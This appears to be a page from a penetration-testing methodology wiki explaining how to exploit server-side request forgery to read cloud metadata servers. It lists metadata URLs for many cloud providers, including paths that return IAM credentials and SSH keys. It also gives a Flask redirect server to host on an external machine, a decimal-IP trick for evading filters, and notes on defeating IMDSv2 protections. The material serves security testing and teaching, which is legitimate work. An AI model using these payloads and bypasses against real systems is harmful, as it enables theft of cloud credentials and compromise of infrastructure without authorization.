If the application you are testing is hosted in the cloud, it is likely that the application's host machine uses a metadata server. The metadata server serves sensitive information, including IAM credentials, internal IP addresses/hostnames, and software versions. 

If you are 100% confident that the application you are testing is not hosted in the cloud, move to [[Identify Active Internal Services]]. You should also move to [[Identify Active Internal Services]] if your SSRF is blind (i.e., you cannot read the response). 

This Impact Technique has one step:
1. Issue requests to internal metadata server URLs

# 1.  Issue requests to metadata server URLs
With the SSRF you've identified, swap out the URL with each of the items from the list below that correspond to your application's cloud provider:
```
## AWS
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

# AWS - Dirs 
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/

## Google Cloud
#  https://cloud.google.com/compute/docs/metadata
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## Google
#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/

## Digital Ocean
# https://developers.digitalocean.com/documentation/metadata/

http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

## Packetcloud
https://metadata.packet.net/userdata

## Azure
#  Limited, maybe more exist?
# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance

## Update Apr 2017, Azure has more support; requires the header "Metadata: true"
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

## OpenStack/RackSpace 
# (header required? unknown)
http://169.254.169.254/openstack

## HP Helion 
# (header required? unknown)
http://169.254.169.254/2009-04-04/meta-data/ 

## Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

## Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
- Courtesy of: https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

You may also find the following links useful:
- [AWS Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [GCP Metadata](https://cloud.google.com/compute/docs/metadata/overview)
- [Azure Metadata](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=windows)

If none of the URLs for your cloud provider work, but you can redirect to arbitrary external URLs, try some of the techniques below:

## Bypassing SSRF Blacklists
Sometimes the application developers will anticipate SSRF vulnerabilities and use a blacklist to block requests for specific URLs. If this is the case, you can try to host an external server to redirect the request to the metadata server. Developers do not always check the blacklist for both the initial request URL and any subsequent redirect URLs. 

For example, you could host the following Python application on a cloud VM:
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect_302', methods=["GET", "POST"])
def redirect302():
    return redirect("METADATA-URL")

@app.route('/redirect_307', methods=["GET", "POST"])
def redirect307():
    return redirect("METADATA-URL")


app.run(host='0.0.0.0', port=8000)
```
- Replace `METADATA-URL` with the metadata URL you observed getting blocked.
- When you boot your VM up, take note of it's IP address (`EXTERNAL-SERVER-IP)

If you are trying to issue a `GET` request to the metadata server, you would then use the following URL in your SSRF payload: `http://EXTERNAL-SERVER-IP:8000/redirect_302`

If you are trying to issue a non-`GET` request to the metadata server, you would then use the following URL in your SSRF payload: `http://EXTERNAL-SERVER-IP:8000/redirect_307`


If the backend is blocking all IP addresses with a regex, you may also try to convert your IP address into decimal format to bypass the regex:
```python
import socket, struct, sys

def ip2long(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]

print(ip2long(sys.argv[1]))
```
```
% python convert_ip.py 142.250.113.138
2398777738
```

In this case, you would try `https://2398777738` instead.

## Bypassing IMDSv2
Cloud administrators frequently enable IMDSv2 (or equivalent) on their metadata servers. This essentially requires specially crafted HTTP requests to retrieve any metadata. IMDSv2 is designed in part to protect against SSRF attacks, as you cannot retrieve data from an IMDSv2 metadata server using a simple GET request. While the precise formats/requirements depend on the cloud provider, they generally require:
- A non-GET HTTP method (usually PUT)
- A special HTTP header set

Because of these requirements, when IMDSv2 is enabled, you can only achieve this Impact Technique if you also have control over the HTTP method and HTTP headers in the request. The `redirect_307` URL in the Flask server above can come in handy here to bounce a PUT or POST request off your external server and to the metadata server, but you will still need some method of manipulating HTTP headers. 

There are no silver bullets here, unfortunately. Review the full functionality of the feature that is vulnerable to SSRF and its backend source code. It is possible that the feature allows users to set their own HTTP headers or has a vulnerability in the source code that enables the user to manipulate headers (e.g., `\r\n` injection). But barring these unusual circumstances, you will not be able to achieve this Impact Technique. Proceed to [[Identify Active Internal Services]].